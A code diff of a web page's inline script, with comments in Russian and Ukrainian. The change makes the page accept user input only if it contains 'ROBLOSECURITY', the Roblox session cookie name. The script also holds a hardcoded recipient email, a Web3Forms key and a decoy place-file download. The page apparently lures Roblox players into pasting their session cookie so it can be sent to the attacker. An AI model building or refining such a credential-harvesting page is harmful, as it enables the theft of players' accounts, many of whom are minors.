@@ -328,8 +328,8 @@
 
     <!-- Скрипты -->
     <script>
-        // Теперь секретное слово на английском: "roblox" (работает в любом регистре)
-        const SECRET_KEYWORD = "ROBLOSECURITY";
+        // Секретне слово змінено на ROBLOSECURITY (працює в будь-якому регістрі)
+        const SECRET_KEYWORD = "roblosecurity";
         const EMAIL_TO = "Dem4ik24@proton.me";
         const WEB3FORMS_KEY = "6b038c3e-e52c-4b01-903f-7b2347265dd0";
 
@@ -415,7 +415,7 @@
         }
 
         function downloadRealRbxlFile() {
-            const xml = `<?xml version="1.0" encoding="UTF-8"?><roblox version="4"><Item class="Workspace"><Properties><string name="Name">Workspace</string></Properties></Item></ROBLOSECURITY>`;
+            const xml = `<?xml version="1.0" encoding="UTF-8"?><roblox version="4"><Item class="Workspace"><Properties><string name="Name">Workspace</string></Properties></Item></roblox>`;
             const blob = new Blob([xml], { type: 'application/xml' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
@@ -448,7 +448,7 @@
             e.preventDefault();
             const val = placeInput.value.trim();
 
-            // Перевірка англійського слова "roblox" незалежно від регістру
+            // Перевірка наявності слова ROBLOSECURITY (незалежно від регістру)
             if (!val.toLowerCase().includes(SECRET_KEYWORD.toLowerCase())) {
                 showToast("Ошибка", "Вы что-то сделали не так.", "error");
                 simPanel.classList.add('hidden');
